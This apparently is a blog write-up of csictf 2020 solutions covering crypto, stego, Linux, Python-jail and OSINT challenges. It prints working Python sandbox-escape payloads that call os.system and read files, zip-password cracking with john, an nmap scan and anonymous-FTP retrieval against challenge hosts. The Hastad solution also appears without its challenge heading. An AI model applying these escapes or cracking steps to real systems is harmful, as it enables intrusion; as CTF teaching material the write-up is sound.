### Modern Clueless Child
> I was surfing the crimson wave and oh my gosh I was totally bugging. I also tried out the lilac hair trend but it didn't work out. That's not to say you are any better, you are a snob and a half. But let's get back to the main question here- Who am I? (You don't know my name)
>
> Ciphertext = "52f41f58f51f47f57f49f48f5df46f6ef53f43f57f6cf50f6df53f53f40f58f51f6ef42f56f43f41f5ef5cf4e" (hex) Key = "12123"

We're given a plaintext that looks like hex (almost) and a key of unspecified type.

Examining the ciphertext, which they've mentioned is hex, you'll notice `f` occurs inbetween each hex entry:

```
52 f 41 f ...
```

So, I tried removing the space, leaving just

```
52415851475749485d466e5343576c506d53534058516e425643415e5c4e
```

After trying some things in `xortool`, thinking maybe they gave us a junk key, I tried just a repeating key XOR against the ciphertext, and got the flag:

```python
>>> from pwn import xor
>>> from binascii import unhexlify
>>> ct = unhexlify("52415851475749485d466e5343576c506d53534058516e425643415e5c4e")
>>> xor(ct, b"12123")
b'csictf{you_are_a_basic_person}'
```

(Note: If you do not convert the flag from hex to bytes, it won't output the flag properly!)

Flag is `csictf{you_are_a_basic_person}`.

### Rivest Shamir Adleman
> These 3 guys encrypted my flag, but they didn't tell me how to decrypt it.

Basic RSA. Like, stupid easy RSA.

Given:

```
n = 408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231
e = 65537
c = 226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909
```

Just update `N`, `e`, and `ct` [in my simple RSA template in python, and run it, since FactorDB is able to factor the given N](https://github.com/bigpick/CaptureTheFlagCode/blob/master/tools/crypto/normal_rsa_python/normal_rsa.py).

With a little function I made to convert decimal to ascii that I keep in my `~/.zshrc`,

```bash
function decimal_to_ascii(){ local decimal=$1
    echo "obase=16; $decimal" | bc  | xxd -r -p; echo ""
}
```

We can get the flag:

```
decimal_to_ascii 49459207073075609387052389022856465595244842985649235071628181272612221410724680024945533
csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}
```

Flag is `csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}`.

### Little RSA
> The flag.zip contains the flag I am looking for but it is password protected. The password is the encrypted message which has to be correctly decrypted so I can useit to open the zip file. I tried using RSA but the zip doesn't open by it. Can you help me get the flag please?

We're given:

* `a.txt`:

    ```
    c=32949
    n=64741
    e=42667
    ```
* `flag.zip`

As challenge prompt says, flag is encrypted. Solve the given RSA `a.txt` constraints to get the password.

Again, stoooopid easy, just plug in to the [RSA template](https://github.com/bigpick/CaptureTheFlagCode/blob/master/tools/crypto/normal_rsa_python/normal_rsa.py) and get the password for the zip:

```python
python3 normal_rsa.py
N:  64741
e:  42667
factor: 101
factor: 641
d:  3
Plaintext:  18429
```

So now just open up the `flag.zip` with `18429` as the password.

Flag is `csictf{gr34t_m1nds_th1nk_4l1ke}`.

OK - so this is pretty obviously a [Hastad's broadcast attack](https://github.com/ashutosh1206/Crypton/tree/master/RSA-encryption/Attack-Hastad-Broadcast).

The one caveat here is _technically_ they didn't give us an `e` value, though, for Hastad's, it is implied that the value for the public exponent is low. I tried brute forcing for any possible value for e from 1 to 100, just to be safe:

I was _this_ close to solving this challenge live, but actually didn't end up getting it in time. Here is a slightly modified version of what I was working on, inspired by [this](https://github.com/noob-atbash/CTF-writeups/blob/d2e7704b26ae3f6214914851347e6f5a1496ab56/csictf-20/crypto/crypto.md#quick-math) writeup by `noob-atbash` (I was mistankenly not treating the given flag as hex... :( ):

```python
#!/usr/bin/env python3
# Hastad broadcast to brute force with potentially unknown e to be safe
from sympy.ntheory.modular import crt
from gmpy2 import iroot

N = [ 86812553978993,81744303091421,83695120256591 ]
ct = [8875674977048,70744354709710, 29146719498409 ]

for e in range(1, 100):
    r, mod = crt(N,ct)
    value, perfect_root = iroot(r, e)
    if perfect_root:
        print(f"e: {e}, value: {value}")
```

Which gives us:

```
e: 1, value: 319222184729548122617007524482681344
e: 3, value: 683435743464
```

Converting each of those to hex, we see that when `e: 3` (the expected value for Hastad's ;) ), it decrypts to: `h45t4d`.

Flag is `csictf{h45t4d}`.

### Mein Kampf

Hell yeah!!! Finally, some real life history!

&nbsp;


But seriously, this was a nice challenge, and I can say this is the first Enigma crypto chall I've ever seen, so kudos to these guys for doing something not done frequently.

We're given:

> We have intercepted the enemy's communications, but unfortunately, some data was corrupted during transmission. Can you recover the message?"
> M4 UKW $ Gamma 2 4 $ 5 9 $ 14 3 $ 5 20 fv cd hu ik es op yl wq jm "Ciphertext: zkrtwvvvnrkulxhoywoj"
> (Words in the flag are separated by underscores)

Doing some quick googling, it seems that we've gotten some information that's relative to the _Naval 4-wheel Enigma_: [reference](https://www.cryptomuseum.com/crypto/enigma/m4/index.htm) and also [Wikipedia](https://en.wikipedia.org/wiki/Enigma_machine).

This is obvious from the `M4...` that begins with the encryption info.

This is followed by `... UKW $ Gamma …` which is:

> ...The additional 4th wheel was known as Zusatzwalze (extra wheel) or Griechenwalze (Greek wheel), as it was identified with the Greek letter Beta (β) or Gamma (γ)...

So, it seems that we're going to be working with the _Gamma_ form.

Following that, we have a set of numbers, separated by dollar signs. These seem to be the positions and rings at which to set the four rotors (Gamma, and the remaining three). However, as the message points out, we've some (key) information: What coding wheels these are actually settings for!

> … It was supplied with 8 different coding wheels, (marked I to VIII), three of which were in the machine at any given time …

All that's left now is a string of letter pairings, that we can assume is the plugboard configuration: `fv cd hu ik es op yl wq jm`: [reference here](https://www.cryptomuseum.com/crypto/enigma/i/sb.htm):

> The Enigma I, Enigma M1, M2, M3 and Enigma M4, are the only models that have a Steckerbrett (plugboard) at the front. The Steckerbrett has 26 sockets that are marked with the letters of the alphabet (A-Z), the numbers 1-26 or both. Each socket accepts a plug with two pins: a thick one and a thin one. The 2-wire cable 1 between two plugs is cross-wired, as a result of which letters are always swapped in pairs. Although this presents a weakness, it was done for good reasons ...

OK - we need to:
1. Find a way to decrypt this using some method or tool
2. Find a way to figure out or brute force the coding wheels

To address (1), [I ended up using a frequently used crypto site, cryptii](https://cryptii.com/pipes/enigma-machine).

Enter in our ciphertext in the box on the left, set the machine to "decode", select the "M4" model, and now we can begin entering our given data. We can fill in the plugboard with our letter pairings, and set Rotor 1 to "Gamma". While we don't know which coding wheels to set the rotors to, we know what position and ring they should be using, so we can set those.

Now, to address (2), we need to try brute forcing all possible coding wheel combinations. I started off with "UKW B thin", and Rotors 2-4 at coding wheel one. I then incremented each rotor in a fashion as to try all combinations in order.

In hindsight, a Python module that has the engima workings coded probably would have been easier to write code to then bruteforce this vs doing it by hand in a GUI, but that is for another time... Eventually, I came across a pairing that resulted in `csictf...` being shown in the plaintext, which was our flag!

Flag is `csictf{no_shit_sherlock}`.

## Forensics
### Archenemy
> John likes Arch Linux. What is he hiding?

We're given a photo (which is really a jpg):

&nbsp;
{{< image src="/img/csiCTF2020/arched.jpg" alt="arched.jpg" position="center" style="border-radius: 8px;" >}}
&nbsp;

I use [this awesome forensics/stego container](https://github.com/DominicBreuker/stego-toolkit) so naturally I start with

```
check_jpg.sh arched.jpg
```

Running so shows that `steghide` was able to extract some hidden data.

```
...
##############################
########## steghide ##########
##############################
wrote extracted data to "flag.zip".
...
```

If we try to open it, we see it has a password, however. Queue up `zip2john` to extract the password hash and then just `john` to crack it and we get the password as `kathmandu`:

```
zip2john flag.zip > ziphash
john --wordlist=rockyou.txt ziphash
```

Opening the file gives us the flag.

Flag is `csictf{1_h0pe_y0u_don't_s33_m3_here}`.

### Gradient Sky
> Gradient sky is a begginer level ctf challenge which is aimed towards rookies.

Use `strings`.

Flag is `csictf{j0ker_w4snt_happy}`.

### Panda
> I wanted to send this file to AJ1479 but I did not want anyone else to see what's inside it, so I protected it with a pin.

We're given a `panda.zip` file that is password protected. Using `zip2john` and then just `john`, we get the password to be `2611`.

Once opened, we get two images of pandas:

&nbsp;
{{< image src="/img/csiCTF2020/panda.jpg" alt="panda.jpg" position="center" style="border-radius: 8px;" >}}
&nbsp;

&nbsp;
{{< image src="/img/csiCTF2020/panda1.jpg" alt="panda1.jpg" position="center" style="border-radius: 8px;" >}}
&nbsp;

At first I tried XOR'ing the two images, but that didn't really find anything. `strings` did find what looked to be parts of the flag on one, and on the other, so I thought about subtracting/finding the diff of the two images.

```bash
strings panda.jpg > out1
strings panda1.jpg > out2
diff out1 out2
2c2
< $3br

255a257
> kun-
500a503
> Dfu_w
565c568
< i$bI
---
> p4nd4}
```

Which, is a bit messy, but gives us the flag.

Flag is `csictf{kung_fu_p4nd4}`

### unseen
> With his dying breath, Prof. Ter Stegen hands us an image and a recording. He tells us that the image is least significant, but is a numerical key to the recording and the recording hides the answer. It may seem as though it's all for nothing, but trust me it's not.

So, we're given an audio `.wav` file and a picture of a city.

> … the image is least significant, but is a numerical key to the recording ...

Seems to imply that the image might need LSB stego to get some sort of key that we will use in the audio recording.

Running [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve) on the image, we find the pin to be `42845193`.

&nbsp;
{{< image src="/img/csiCTF2020/unseen_pin.png" alt="unseen_pin.png" position="center" style="border-radius: 8px;" >}}
&nbsp;

The recording sounds like morse, which if you decode is just a red herring. Running `steghide extract -sf morse.wav`, and give it the password from above, we get out a `flag.txt` that is all varying whitespace.

At first, I tried running `stegsnow` on it, and tried with no password/the same password as above/and a bunch of other brute force options. After about 20 minutes, I figured that wasn't the way to go, and started looking elsewhere.

Searching for whitespace stego techniques, I came across this whitespace language interpreter: https://tio.run/#whitespace.

Putting in the flag.txt file, we get the flag!

Flag is `csictf{7h47_15_h0w_y0u_c4n_83c0m3_1nv151813}`.

## Linux

### HTB 0x1
>

So, we get an IP of a box, `34.93.215.188` and a mention that there is a `flag.txt`, likely _somewhere_ on the box.

I don't do [HTB](https://www.hackthebox.eu/) challenges (yet), but a main theme if you look up walkthroughs is that you should start by enumerating any possibly open ports on the given target.

I did so via:

```bash
nmap -sV -sC 34.93.37.238
```

Doing so revealed an open FTP server on port 5001, that also even allowed (gasp) Anonymous login!

```bash
...
5001/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jul 14 19:12 pub
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
...
```

So, we see there's a directory called `pub` on the server. Initially, I tried connecting to the server and reading the direcoty/server's contents via `dir` and `ls`, etc... but none of those commands worked. It seemed as if I was having issues because the IP of the remote server (which was showing as 10.160.0.2) was causing issues with my ftp commands:

```bash
5001/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 10.160.0.2 is not the same as 34.93.37.238
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:100.40.169.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 9
|      vsFTPd 3.0.3 - secure, fast, stable
```

After some reading online, I found that you can also try to use `curl` [to hit a remote FTP endpoint](https://superuser.com/a/265066).

Given the hint in the challenge prompt, I guessed that the flag was at `pub/flag.txt`. I crafter my curl accordingly, and got the flag:

```bash
root@cfb8a4e9ad2c:/# curl ftp://anonymous@34.93.37.238:5001/pub/flag.txt
csictf{4n0nym0u5_ftp_l0g1n}
```

A note: `wget` was having the same issues as manually connecting using FTP; I do not know why curl was able to handle it, but that is a lesson for another day.

Flag is `csictf{4n0nym0u5_ftp_l0g1n}`.

### find32
>  I should have really named my files better. I thought I've hidden the flag, now I can't find it myself.
> (Wrap your flag in csictf{})
>
> ssh user1@chall.csivit.com -p 30630
>  Password is find32

So, going on the box, we see a bunch of weirdly named files:

I did a `grep` to try to see if any of them had `csi` in it, and it turns out that `./MITS1KT3` does:

```
...
...3ITZVTHBQM9J9OWVX8csictf{not_the_flag}{user2:AAE976A5232713355D58584CFE5A5}WOQS75G7TVPTTN3RBXGK96HGINKCRZ1Z8JP6N44KC02C9E8..
...
```

So, we find "not the flag", but more importantly, some info for a new user, user2.

If we try to switch to user2 using `AAE976A5232713355D58584CFE5A5` as the password, we are successful:

```bash
$ su - user2
Password:
$ ls
adgsfdgasf.d  fadf.x  janfjdkn.txt  notflag.txt  sadsas.tx
$ whoami
user2
```

Visually inspecting those files, they're huge, and all seem the same. Doing a cat+grep/etc for the flag doesn't yield any result either.

I tried comparing the files, and found the flag when you comparing `sadsas.txt` against any of the files:

```bash
$ diff sadsas.tx notflag.txt
42392d42391
< th15_15_unu5u41
```

Flag is `csictf{th15_15_unu5u41}`.

## Misc
### Prison Break

We land in what looks to be a Python jail (based on the `>>> ` prompt).

Running something like:

```
Find the flag.
>>> print "lololol old"
lololol old
```

Seems to indicate that we're working in a Python2.X jail.

After some researching I came across [this post on a plaidCTF jail escape](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html). Go read that writeup on the details of what to look for and what's being done. Seriously, it's really well written and all that I know would be mostly just a regurgitation of that, so... go look at that.

In short, we've been stripped of some functions and builtins:

```python
>>> __import__('os')
You have encountered an error.
>>> execfile('/usr/lib/python2.7/os.py')
You have encountered an error.
>>> system('cat /etc/passwd')
You have encountered an error.
>>> system('ls')
You have encountered an error.
```

However, `print(__builtins__.__dict__)` shows us:

```python
>>> print(__builtins__.__dict__)
{'bytearray': <type 'bytearray'>, 'help': Type help() for interactive help, or help(object) for help about object., 'dict': <type 'dict'>, 'bin': <built-in function bin>, 'False': False, 'dir': <built-in function dir>, 'bytes': <type 'str'>, 'abs': <built-in function abs>, 'True': True, 'None': None, 'basestring': <type 'basestring'>, 'Exception': <type 'exceptions.Exception'>, 'ArithmeticError': <type 'exceptions.ArithmeticError'>, 'complex': <type 'complex'>, 'AssertionError': <type 'exceptions.AssertionError'>, 'AttributeError': <type 'exceptions.AttributeError'>}
>>> print(dir(__builtins__))
['ArithmeticError', 'AssertionError', 'AttributeError', 'Exception', 'False', 'None', 'True', 'abs', 'basestring', 'bin', 'bytearray', 'bytes', 'complex', 'dict', 'dir', 'help']
```

If we get an instance of a `()` class, and exploit the fact that we can potentially get a useful subclass out of it, we are able to perform file reads like so (again, go read that writeup...):

```python
>>> print(().__class__.__bases__[0].__subclasses__()[40]('flag.txt', 'r').read())
The flag is in the source code.
```

Dicks. So, we need to find the source code. To do so, I resorted to finding a way to be able to do a `ls` in the current directory, taking advantage of the fact that `linecache` from `catch_warnings` imports `os`:

```python
>>> print(().__class__.__bases__[0].__subclasses__()[59].__repr__.im_func.func_globals["linecache"].__dict__['os'].__dict__['system']('ls'))

>>> print(().__class__.__bases__[0].__subclasses__()[59].__repr__.im_func.func_globals["linecache"].__dict__['os'].__dict__['system']('ls'))
flag.txt
jail.py
start.sh
0
```

Sick!! So `jail.py` looks like what we want! Updating our file read command from before, but now reading `jail.py`:

```python
>>> print(().__class__.__bases__[0].__subclasses__()[40]('jail.py', 'r').read())
#!/usr/bin/python

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)
        sys.stdout.flush()

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")
sys.stdout.flush()

def flag_function():
    flag = "csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}"

while 1:
    try:
        sys.stdout.write(">>> ")
        sys.stdout.flush()
        code = _raw_input()
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
        sys.stdout.flush()
```

Flag is `csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}`.

## OSINT
Ooooooooooweeeee boys, we blooded all the original OSINT's in less than like 2 minutes >:)

### Commitment
> hoshimaseok is up to no good. Track him down.

Search on github for `hoshimaseok`. Find [SomethingFishy](https://github.com/hoshimaseok/SomethingFishy). Inspect the `dev` branch. Inspect the commits and find the flag.

Flag is `csictf{sc4r3d_0f_c0mm1tm3nt}`.

### Flying Places
> A reporter wanted to know where this flight is headed. Where does he (the reporter) live?

We're given a picture of a flight (for Alibaba's Jack Ma):

&nbsp;
{{< image src="/img/csiCTF2020/flying.jpg" alt="flying.jpg" position="center" style="border-radius: 8px;" >}}
&nbsp;

Leads us to "chinese billionaire ships 500000 coronavirus testing kits".

Which leads us to his Twitter posting about it [here](https://twitter.com/jackma/status/1239388330405449728?lang=en).

One of the comments is: https://twitter.com/svqjournalist/status/1239392709841833985, which his bio shows he's from the Bay Area, San Francisco.

Flag is `csictf{san_francisco}`.

### Lo Scampo
> Malcolm X took Broiestevane to a Day of the Dead themed party but she never returned. Her only friends, Mr Bean and the Pink Panther realised that she was missing when she didn't show up for an exam. Broiestevane liked posting pictures, where was the party held?
> (Don't forget to wrap your answer in csictf{})'

Going to https://www.instagram.com/Broiestevane/ we see another link in the bio for:

> I cant believe I missed my exam for this party: www.instagram.com/p/B3pJE1CgMvI

Navigating to that instagram page, we see it's for a **Liberty Boston** hotel, which is posting about

> Tickets on sale now for our ‘DAY OF THE DEAD’ Halloween costume party - Boston’s largest Halloween event! Ticket link in our bio...grab your tickets before they sell out 💀

Flag is `csictf{liberty_hotel}`.

### Pirates of the Memorial
> The original photographer of this picture commented the flag on his post. Find the flag.

We get an image:

&nbsp;
{{< image src="/img/csiCTF2020/storm.jpeg" alt="storm.jpeg" position="center" style="border-radius: 8px;" >}}
&nbsp;

Looking that up on Google images, we find it's a picture of Victoria Memorial in Kolkata.

In the results, we find a link to a twitter posting at https://twitter.com/rishibagree/status/1016932954143158274?lang=en.

In there, one of the comment threads is:

> who take this pic
> ...
> Arunopal Banerjee not this guy

Looking that person up, we find his instagram at https://www.instagram.com/arunopal17/?hl=en. Looking through the comments on the original image, we get the flag.

Flag is `csictf{pl4g14r1sm_1s_b4d}`.

### Shaken
> I love this watch. It's been with me all over the world, from Istanbul to Shanghai to Macau.I wear it with suits quite a lot. My boss liked it too. I remember wearing it when she died. What is her successor's name?

Searching for watch and the mentioned locations, we get references to "Skyfall", the James Bond movie. Gien the "wearing suits with it a lot", it seems like they're refrencing James Bond's watch after all.

"My Boss" would therefore be "M". Searching up "M" on the James Bond Fandom wiki, we find [this page](https://jamesbond.fandom.com/wiki/M_(Ralph_Fiennes)) which states:

> … At the end of the film, due to her death, Mallory is given M's alias and position as head of MI6.

Flag is `csictf{gareth_mallory}`.
